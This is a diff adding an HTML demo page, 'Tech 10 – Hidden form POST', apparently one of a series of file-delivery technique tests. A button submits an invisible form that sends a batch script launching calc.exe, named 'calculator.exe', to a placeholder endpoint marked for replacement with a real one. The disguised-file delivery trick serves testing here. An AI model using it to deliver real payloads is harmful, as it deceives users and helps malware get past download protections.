@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Tech 10 – Hidden form POST</title>
+<style>/* same styles */</style>
+</head>
+<body>
+<h2>Tech 10 – Hidden form POST</h2>
+<button onclick="run()">Submit hidden form</button>
+<pre id="out" style="margin-top:10px;"></pre>
+<script>
+function run(){
+  const form = document.createElement('form');
+  form.action = 'https://example.com/api/download';   // ← replace with real endpoint
+  form.method = 'POST';
+  form.style.display = 'none';
+
+  const payload = document.createElement('input');
+  payload.type = 'hidden';
+  payload.name = 'payload';
+  payload.value = '@echo off\nstart calc.exe';
+
+  const fname = document.createElement('input');
+  fname.type = 'hidden';
+  fname.name = 'filename';
+  fname.value = 'calculator.exe';
+
+  form.appendChild(payload);
+  form.appendChild(fname);
+  document.body.appendChild(form);
+  form.submit();
+  document.getElementById('out').innerText = 'Form posted to example.com (hidden‑form trick)';
+}
+</script>
+</body>
+</html>
